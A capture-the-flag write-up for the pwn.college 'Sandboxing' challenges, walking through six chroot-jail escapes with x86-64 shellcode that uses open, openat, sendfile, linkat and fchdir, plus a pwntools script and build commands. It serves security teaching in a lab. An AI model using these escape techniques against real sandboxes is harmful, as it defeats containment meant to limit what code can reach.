---
custom_edit_url: null
---

:::tip

You can find the full code for all challenges [here](https://github.com/kunalwalavalkar/Pwn-College/tree/main/Sandboxing).

:::

## level 1

> This challenge will chroot into a jail in /tmp/jail-XXXXXX. You will be able to easily read a fake flag file inside this jail, not the real flag file outside of it. If you want the real flag, you must escape. The only thing you can do in this challenge is read out one single file, as specified by the first argument to the program (argv\[1]).

Let's look at the source code.

```
assert(chroot(jail_path) == 0);
```

Notice that even though the jail has been set, the program did not change directory to `/` and put us in that jail.

That means we are effectively not in jail.

If we give it `/flag` as `argv[1]`, it is interpreted as `/tmp/jail/flag`, which gives us the fake flag.

In order to get the real flag, we have to pass the relative address of the real `/flag` from `/tmp/jail/`.

```
$ /challenge/babyjail_level1 ../../flag 
```

The first `..` escapes from the `jail/` and second `..` escapes from the `/tmp/` directory.

&nbsp;

## level 2

> You may open a specified file, as given by the first argument to the program (argv\[1]). You may upload custom shellcode to do whatever you want.

We can use the shellcode that we wrote for Shellcode Injection.

```armasm
.global _start
.intel_syntax noprefix

_start:
	# Open syscall
	lea rdi, [rip + flag]
	mov rsi, 0
	mov rdx, 0
	mov rax, 0x02
	syscall

	# Read syscall
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 1000
	mov rax, 0x00
	syscall

	# Write syscall
	mov rdi, 1
	mov rax, 0x01
	syscall

	# Exit syscall
	mov rdi, 0
	mov rax, 0x3c
	syscall

flag:
	.string "../../flag"
```

We can compile the program using `gdb`.

```
$ gcc -nostdlib ./shellcode.s -o ./shellcode
```

Let's extract the .text section using `objcopy`.

```
$ objcopy --dump-section .text=./shellcode.bin ./shellcode
```

Now we can send this code as STDIN.

```
$ /challenge/babyjail_level2 / < shellcode.bin
```

Note that we are in the `hacker` directory.

The `shellcraft` module from `pwn` allows us to create a shellcode easily. You could also use this method.

```python
from pwn import *

elf = ELF("/challenge/babyjail_level2")

context.arch="amd64"

shellcode = asm(shellcraft.readfile("flag", 1))

p = process(["/challenge/babyjail_level2", "/"], cwd="/")
p.sendline(shellcode)
p.interactive()
```

However creating our own shellcode allows us to have more control over it.

&nbsp;

## level 3

> You may open a specified file, as given by the first argument to the program (argv\[1]). You may upload custom shellcode to do whatever you want.

On examining the code for this level, we can see that this time we have been put into the jail.

```c
assert(chroot(jail_path) == 0);

puts("Moving the current working directory into the jail.\n");
assert(chdir("/") == 0);
```

That means we cannot just `../../flag` our way to getting the flag.

Fortunately, there is `openat` syscall in linux which takes as input a directory file descriptor and then the path of the file to be opened relative to the directory.

```c
int openat(int dirfd, const char pathname, int flags, mode_t mode);
```

In our case, the `dirfd` will be `3`, the first three being STDIN, STDERR and STDOUT.

The `openat` syscall would look something like this:

```armasm
# Openat syscall
mov rdi, 3
lea rsi, [rip + flag]
mov rdx, 0
mov r10, 0
mov rax, 0x101
syscall

flag:
.string "flag"
```

Note that I specified `flag` and not `/flag` because that would reference the file inside `jail/`.

The result of the `openat` syscall is a file descriptor.

We can check it's value in the practice mode using `strace` which traces every system call.

```
$ sudo strace /challenge/babyjail_level3 / < /home/hacker/shellcode.bin

---snip---;
openat(3, "flag", O_RDONLY)             = 4
read(4, "pwn.college{practice}\n", 1000) = 22
---snip---;
```

This result is stored in `$rax` as is the case with most syscall that return a value.

```armasm
# Read syscall
mov rdi, rax
mov rsi, rsp
mov rdx, 1000
mov rax, 0x00
syscall
```

We can pass this shellcode to the challenge.

```
$ /challenge/babyjail_level3 / < /home/hacker/shellcode.bin
```

Note that `/` is our `argv[1]`, which we are using as reference in `openat`.

Since this directory is opened before `chroot()` is executed it won't be in the jail.

&nbsp;

## level 4

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "openat", "read", "write", "sendfile".

We could very well use the previous level's code but let's try something new.

The `sendfile` command is a combination of the `read` and `write` system calls. It's also more efficient as it does not require data to be transferred to and from [user space](https://en.wikipedia.org/wiki/User\_space\_and\_kernel\_space).

It takes the following arguments:

```c
ssize_t sendfile(int out_fd, int in_fd, off_t *_offset, size_t _count);
```

In our case the `out_fd` will be `1` for STDOUT.

```armasm
# Sendfile syscall
mov rdi, 1
mov rsi, rax
mov rdx, 0
mov r10, 1000
mov rax, 0x28
syscall
```

Replace the `read` and `write` syscalls with the above code.

&nbsp;

## level 5

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "linkat", "open", "read", "write", "sendfile"

We can no longer use `openat`, but now we are allowed to use `linkat`.

It takes five arguments.

```c
int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
```

Using `linkat` we can create a [hard link](https://en.wikipedia.org/wiki/Hard\_link) in `/tmp/jail/` that points to the `/flag` file in root `/` directory.

A hard link is an entry that associate a name with a file.

This allows us to access `/flag` inside of `/tmp/jail/` using a different name.

Note that `linkat` returns a value of 0 on success.

```armasm
# Linkat syscall
mov rdi, 3
lea rsi, [rip + old_path]
mov rdx, 4
lea r10, [rip + new_path]
mov r8, 0
mov rax, 0x109
syscall

old_path: 
.string "flag"

new_path: 
.string "/flag2.txt"
```

Now we can access `/flag` using `/flag2.txt`.

&nbsp;

## level 6

> Escape a chroot sandbox using shellcode, but this time only using the following syscalls: "fchdir", "open", "read", "write", "sendfile".

The `fchdir` syscall works similar to `chdir`, the only difference is that it takes a file descriptor as argument.

```c
int fchdir(int fd);
```

So we can effectively just jump out of the `jail/`.

```armasm
# Fchdir syscall
mov rdi, 3
mov rax, 0x51
syscall
```
